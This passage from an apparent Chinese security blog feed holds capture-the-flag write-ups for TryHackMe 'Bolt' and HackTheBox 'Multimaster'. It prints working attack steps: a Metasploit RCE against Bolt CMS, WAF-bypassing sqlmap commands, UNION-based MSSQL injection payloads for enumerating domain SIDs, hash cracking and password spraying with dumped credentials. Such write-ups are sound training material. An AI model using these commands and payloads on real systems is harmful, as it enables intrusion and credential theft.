class="line">SF:PHP/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x2</span><br><span class="line">SF:0public,\x20s-maxage=600\r\nDate:\x20Tue,\x2001\x20Oct\x202024\x2002:14</span><br><span class="line">SF::09\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug-T</span><br><span class="line">SF:oken:\x20cc4424\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang=\&quot;en-GB\&quot;&gt;\n\x</span><br><span class="line">SF:20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20charset=</span><br><span class="line">SF:\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20name=\&quot;viewport\&quot;\</span><br><span class="line">SF:x20content=\&quot;width=device-width,\x20initial-scale=1\.0\&quot;&gt;\n\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Bolt\x20\|\x</span><br><span class="line">SF:20A\x20hero\x20is\x20unleashed&lt;/title&gt;\n\x20\x20\x20\x20\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;link\x20href=\&quot;https://fonts\.googleapis\.com/css\?family=Bitter\|Rob</span><br><span class="line">SF:oto:400,400i,700\&quot;\x20rel=\&quot;stylesheet\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/theme/base-2018/css/bulma\.c</span><br><span class="line">SF:ss\?8ca0842ebb\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;link\x20rel=\&quot;style</span><br><span class="line">SF:sheet\&quot;\x20href=\&quot;/theme/base-2018/css/theme\.css\?6cb66bfe9f\&quot;&gt;\n\x20\</span><br><span class="line">SF:x20\x20\x20\t&lt;meta\x20name=\&quot;generator\&quot;\x20content=\&quot;Bolt\&quot;&gt;\n\x20\x20</span><br><span class="line">SF:\x20\x20\t&lt;link\x20rel=\&quot;canonical\&quot;\x20href=\&quot;http://0\.0\.0\.0:8000/\</span><br><span class="line">SF:&quot;&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body\x20class=\&quot;front\&quot;&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;a\x20&quot;)%r(FourOhFourRequest,1527,&quot;HTT</span><br><span class="line">SF:P/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Tue,\x2001\x20Oct\x202024\x20</span><br><span class="line">SF:02:14:09\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.3</span><br><span class="line">SF:2-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\x</span><br><span class="line">SF:20must-revalidate\r\nDate:\x20Tue,\x2001\x20Oct\x202024\x2002:14:09\x20</span><br><span class="line">SF:GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-ca</span><br><span class="line">SF:che\r\nexpires:\x20-1\r\nX-Debug-Token:\x205d427e\r\n\r\n&lt;!doctype\x20h</span><br><span class="line">SF:tml&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20init</span><br><span class="line">SF:ial-scale=1\.0\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20&lt;title&gt;Bolt\x20\|\x20A\x20hero\x20is\x20unleashed&lt;/title&gt;\n</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20&lt;link\x20href=\&quot;https://fonts\.googleap</span><br><span class="line">SF:is\.com/css\?family=Bitter\|Roboto:400,400i,700\&quot;\x20rel=\&quot;stylesheet\&quot;</span><br><span class="line">SF:&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=</span><br><span class="line">SF:\&quot;/theme/base-2018/css/bulma\.css\?8ca0842ebb\&quot;&gt;\n\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/theme/base-2018/css/t</span><br><span class="line">SF:heme\.css\?6cb66bfe9f\&quot;&gt;\n\x20\x20\x20\x20\t&lt;meta\x20name=\&quot;generator\&quot;</span><br><span class="line">SF:\x20content=\&quot;Bolt\&quot;&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;a\x20href=\&quot;#main-content\&quot;\x20class=</span><br><span class="line">SF:\&quot;vis&quot;);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Tue Oct  1 10:14:51 2024 -- 1 IP address (1 host up) scanned in 75.38 seconds</span><br></pre></td></tr></table></figure><p>访问后发现，在80端口存在<code>apache</code>默认页面，在8000端口运行着<code>Bolt CMS</code></p><h2 id="Bolt-CMS">Bolt CMS</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001102149429-713047204.png" alt="image-20241001102140990"></p><p>在页面找到用户名和密码<code>bolt : boltadmin123</code></p><p>网上搜索发现该CMS默认登录路由是<code>/bolt</code>，利用刚才获得的用户名密码登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001103519405-1390007359.png" alt="image-20241001103512011"></p><p>登录成功后发现该版本为<code>3.7.1</code></p><h1>漏洞利用</h1><p>通过<code>searchsploit</code>查找后发现早期的RCE漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001103939174-1828313295.png" alt="image-20241001103932318"></p><p>为了方便后续操作，这里使用msf进行攻击</p><p>通过<code>msfconsole</code>启动msf后，使用search命令进行查询</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104037415-657957668.png" alt="image-20241001104030417"></p><p>使用<code>use 0</code>命令使用</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104202808-726963840.png" alt="image-20241001104155662"></p><p>输入<code>show options</code>查看必要参数</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104306826-932568411.png" alt="image-20241001104300043"></p><p>将必要参数设置好</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104536892-1525270064.png" alt="image-20241001104529924"></p><p><code>run</code>启动</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001104701130-877158465.png" alt="image-20241001104654139"></p><p>发现直接就是<code>root</code>权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001105113891-316756031.png" alt="image-20241001105107234"></p><p>最终在<code>/home</code>目录下找到flag</p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Bolt</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Multimaster</title>
    <link href="https://www.fomal.cc/posts/aa5df2c0.html"/>
    <id>https://www.fomal.cc/posts/aa5df2c0.html</id>
    <published>2024-07-23T06:31:07.000Z</published>
    <updated>2024-10-06T08:25:29.480Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.179</p><p>攻击机ip：10.10.14.3</p></blockquote><h1>知识点</h1><ul><li>MSSQL注入</li><li>MSSQL注入枚举域用户</li><li>CVE-2019-1414</li><li>滥用GenericWrite权限横向移动</li><li>滥用Server Operators组权限实现权限提升</li><li>SeBackupPrivilege和SeRestorePrivilege权限的滥用</li></ul><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap -sS -sV -sC -p- 10.10.10.179</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 15:15 CST</span><br><span class="line">Nmap scan report for 10.10.10.179</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: 403 - Forbidden: Access is denied.</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-23 07:23:11Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2024-07-23T07:24:51+00:00; +7m01s from scanner time.</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: MEGACORP</span><br><span class="line">|   NetBIOS_Domain_Name: MEGACORP</span><br><span class="line">|   NetBIOS_Computer_Name: MULTIMASTER</span><br><span class="line">|   DNS_Domain_Name: MEGACORP.LOCAL</span><br><span class="line">|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL</span><br><span class="line">|   DNS_Tree_Name: MEGACORP.LOCAL</span><br><span class="line">|   Product_Version: 10.0.14393</span><br><span class="line">|_  System_Time: 2024-07-23T07:24:12+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL</span><br><span class="line">| Not valid before: 2024-07-22T07:10:19</span><br><span class="line">|_Not valid after:  2025-01-21T07:10:19</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49678/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49783/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: MULTIMASTER</span><br><span class="line">|   NetBIOS computer name: MULTIMASTER\x00</span><br><span class="line">|   Domain name: MEGACORP.LOCAL</span><br><span class="line">|   Forest name: MEGACORP.LOCAL</span><br><span class="line">|   FQDN: MULTIMASTER.MEGACORP.LOCAL</span><br><span class="line">|_  System time: 2024-07-23T00:24:13-07:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">|_clock-skew: mean: 1h31m00s, deviation: 3h07m51s, median: 7m00s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-07-23T07:24:16</span><br><span class="line">|_  start_date: 2024-07-23T07:10:28</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 133.27 seconds</span><br></pre></td></tr></table></figure><p>发现有<code>DNS</code>服务、在<code>80</code>端口有<code>http</code>服务、<code>Kerberos</code>服务、<code>rpc</code>服务、<code>smb</code>服务、<code>ldap</code>服务以及<code>3389</code>端口的<code>rdp</code>服务，找到域名为<code>MEGACORP.LOCAL</code>，且主机为<code>Windows Server 2016</code></p><h2 id="SMB">SMB</h2><p><code>smbclient -N -L //10.10.10.179</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723153459937-1324338121.png" alt="image-20240723153457969"></p><p>没什么信息</p><h2 id="rpc">rpc</h2><p><code>rpcclient -U &quot;&quot; 10.10.10.179</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723153807990-1882477100.png" alt="image-20240723153806072"></p><p><code>rpc</code>不允许匿名访问</p><h2 id="ldap">ldap</h2><p><code>ldapsearch -H ldap://10.10.10.179:389 -x -b &quot;DC=MEGACORP,DC=LOCAL&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723154220389-36524757.png" alt="image-20240723154218048"></p><p><code>ldap</code>也失败了，可能是身份验证出现了问题</p><h2 id="http">http</h2><p>在<code>80</code> 端口运行着一个<code>web</code>服务</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723154341955-174699650.png" alt="image-20240723154339541"></p><p>测试后发现几乎都点不了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723155009137-1563602452.png" alt="image-20240723155006560"></p><p>在侧边栏点击<code>Colleague Finder</code>后，会有一个搜索框，什么数据都不输点击回车会显示一些人名等信息，仅此而已</p><p>将用户保存下来，可能后面能用到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sbauer@megacorp.htb</span><br><span class="line">okent@megacorp.htb</span><br><span class="line">ckane@megacorp.htb</span><br><span class="line">kpage@megacorp.htb</span><br><span class="line">shayna@megacorp.htb</span><br><span class="line">james@megacorp.htb</span><br><span class="line">cyork@megacorp.htb</span><br><span class="line">rmartin@megacorp.htb</span><br><span class="line">zac@magacorp.htb</span><br><span class="line">jorden@megacorp.htb</span><br><span class="line">alyx@megacorp.htb</span><br><span class="line">ilee@megacorp.htb</span><br><span class="line">nbourne@megacorp.htb</span><br><span class="line">zpowers@megacorp.htb</span><br><span class="line">zpowers@megacorp.htb</span><br><span class="line">minato@megacorp.htb</span><br><span class="line">egre55@megacorp.htb</span><br></pre></td></tr></table></figure><p>在尝试拿<code>gobuster</code>扫描一下，看看是否有其他信息</p><p><code>gobuster dir -u http://10.10.10.179 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723164047789-118911268.png" alt="image-20240723164045428"></p><p>结果发现有巨多的403，不太符合正常情况，猜测有waf存在</p><p>这种搜索等功能可能会存在<code>sql</code>注入之类的洞，拿<code>burpsuit</code>抓个包看看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723161658318-1989998677.png" alt="image-20240723161655843"></p><p>参数为<code>'</code>试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723185010410-55567549.png" alt="image-20240723185008069"></p><p>发现会报错，说明存在过滤，但是没有什么<code>waf</code>信息，尝试<code>fuzz</code>一下</p><p><code>wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d '&#123;&quot;name&quot;:&quot;FUZZ&quot;&#125;' -H 'Content-Type: application/json;charset=utf-8' -t 1 --hc 200</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723200250049-1678420648.png" alt="image-20240723200247938"></p><p>发现返回包中设置的字符编码是<code>utf-8</code>，尝试一下其他编码能否绕过</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723201457071-400479735.png" alt="image-20240723201454802"></p><p>测试后发现将<code>'</code>按照<code>unicode</code>编码后发现可以正常查询。绕过成功</p><h1>MSSQL注入</h1><h2 id="sqlmap获取数据">sqlmap获取数据</h2><p>通过<code>unicode</code>编码可以绕过<code>waf</code>，就能正常注入了，这里直接拿<code>sqlmap</code>跑一下</p><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch</code></p><blockquote><p><code>--tamper=charunicodeescape</code>：将payload中的所有字符进行unicode编码</p><p><code>--delay 5</code>： 延迟时间为5s，避免请求次数太快被ban</p><p><code>--level 5 --risk 3</code>：使用更全面更复杂的payload</p><p><code>--batch</code>：自动接受所有提示</p></blockquote><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724141638815-1142390614.png" alt="image-20240724141634076"></p><p>从上述结果中可以发现，该数据库是<code>SQL Server</code>并且<code>sqlmap</code>成功执行，继续找数据库名</p><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -dbs</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724142014523-1333297535.png" alt="image-20240724142006540"></p><p>先查看<code>Hub_DB</code>数据库看看有哪些表</p><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -tables</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724143527309-1226900171.png" alt="image-20240724143522636"></p><p>有两个表，直接查看一下表中的值</p><ul><li><code>Colleagues</code></li></ul><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -T Colleagues --dump</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724143758776-409341571.png" alt="image-20240724143754224"></p><p>这是一张同事表，存储着每个人的信息</p><ul><li><code>Logins</code></li></ul><p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -T Logins --dump</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724144019780-335466335.png" alt="image-20240724144015197"></p><p>发现是所有用户的用户名和密码，将用户名和密码保存到文件中，方便后续使用</p><ul><li><code>users</code></li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sbauer</span><br><span class="line">okent</span><br><span class="line">ckane</span><br><span class="line">kpage</span><br><span class="line">shayna</span><br><span class="line">james</span><br><span class="line">cyork</span><br><span class="line">rmartin</span><br><span class="line">zac</span><br><span class="line">jorden</span><br><span class="line">alyx</span><br><span class="line">ilee</span><br><span class="line">nbourne</span><br><span class="line">zpowers</span><br><span class="line">aldom</span><br><span class="line">minatotw</span><br><span class="line">egre55</span><br></pre></td></tr></table></figure><ul><li><code>passwords</code></li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa</span><br><span class="line">68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813</span><br><span class="line">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739</span><br><span class="line">cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc</span><br><span class="line">cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc</span><br></pre></td></tr></table></figure><p>这时发现大多数密码都是一样的</p><h2 id="hashcat破解密码">hashcat破解密码</h2><p>先利用<code>john</code>尝试破解密码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724154238265-1306385108.png" alt="image-20240724154233559"></p><p>发现并没有成功，尝试使用<code>hash-identifier</code>查看数据类型</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724154552885-955828641.png" alt="image-20240724154548438"></p><p>发现长度为384，测试后发现是<code>Keccak-384</code></p><p><code>hashcat -m 17900 passwords /usr/share/wordlists/rockyou.txt --force</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724154759021-1055109536.png" alt="image-20240724154754519"></p><p>最后也是成功破解出三个密码，虽然数据库中有一堆用户，但是只有四个唯一的密码找到与其对应的用户名</p><table><thead><tr><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>sbauer, shayna, james, cyork, jorden, aldom</td><td>password1</td></tr><tr><td>ckane, kpage, zac, ilee, zpowers</td><td>finance1</td></tr><tr><td>okent, rmartin, alyx, nbourne</td><td>banking1</td></tr><tr><td>minatotw, egre55</td><td>未知</td></tr></tbody></table><p>发现不知道密码的两个人身份是<code>CEO</code>，将密码重新保存至新的文件<code>passwds</code></p><h2 id="密码喷洒">密码喷洒</h2><p>将提取出来的密码保存下来，尝试使用<code>crackmapexec</code>进行密码喷洒</p><p><code>crackmapexec smb 10.10.10.179 -u users -p passwords</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724161246263-1891197988.png" alt="image-20240724161241655"></p><p>都失败了，只能寻找其他办法了，尝试寻找其他数据库中的信息，然而这些数据库中没有有用的信息</p><h1>MSSQL 注入枚举域用户名</h1><h2 id="攻击原理">攻击原理</h2><blockquote><p>通过网上搜索发现可以使用 RID 蛮力通过 MSSQL 注入来执行Active Directory枚举获取用户名</p><p>攻击原理：</p><ul><li>找出域名</li><li>找出域的SID</li><li>通过迭代一系列 RID 来确定每个对象的名称，从而构建用户、组和计算机 SID</li></ul><p><a href="https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html">参考链接</a></p></blockquote><blockquote><p>SQL Server中有一个函数叫做SUSER_SID()可以用来，它可以返回给定用户的安全标识号（SID），使用它来标识主域管理员的SID。</p><p>利用SQL注入枚举域内用户主要用到两个函数是SUSER_SID和SUSER_SNAME</p><p><a href="https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-sid-transact-sql?view=sql-server-ver16">SUSER_SID()函数说明</a></p><p><a href="https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql?view=sql-server-ver16">SUSER_SNAME()函数说明</a></p><p>先使用SUSER_SID函数拿到域的SID，之后使用SUSER_SNAME函数通过之前拿到的SID进行拼接RID进行枚举域用户名，之后在通过拿到的域用户名喷洒之前获得的凭据密码。</p></blockquote><p>从之前<code>sqlmap</code>获取数据部分可以知道，字段数为5，回显位置是4</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724182312718-55166275.png" alt="image-20240724182307833"></p><p>这里借助<code>CyberChef</code>工具的<code>Escape Unicode Characters</code>模块，可以很方便的帮助我们进行编码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724183224966-434528211.png" alt="image-20240724183219833"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724182733745-1169710557.png" alt="image-20240724182729157"></p><p>可以看到，将<code>sqlmap</code>跑出来的<code>Payload</code>经过<code>unicode</code>编码后，利用<code>burpsuite</code>发送仍然有效，数据显示在阿<code>email</code>位置，接下来就可以继续操作了</p><h2 id="获取默认域">获取默认域</h2><p>第一步就是要获取域的名称，利用<code>default_domain()</code>函数获取域名</p><p><code>a ' union select 1,2,3,(select default_domain()),5 --</code></p><p>将<code>payload</code>编码后发送</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724184629285-1312604411.png" alt="image-20240724184624729"></p><p>可以获得域名<code>MEGACORP</code></p><h2 id="获取域的-SID">获取域的 SID</h2><p>知道域名后，可以使用一致的内置账户或组（如：<code>Administrator</code>账户）注入获取<code>SID</code>值，在无类型转换的情况下会返回一个二进制数据，不利于我们读取，所以使用<code>sys.fn_varbintohexstr</code>将其包装起来，使其能够在<code>http</code>中直观地看出数据</p><blockquote><p><code>sys.fn_varbintohexstr</code> 是 Microsoft SQL Server 中的一个系统函数。它用于将二进制数据转换为十六进制字符串表示</p></blockquote><p><code>a ' union select 1,2,3,(select sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))),5 --</code></p><p>将<code>payload</code>编码后发送</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724185434633-319141801.png" 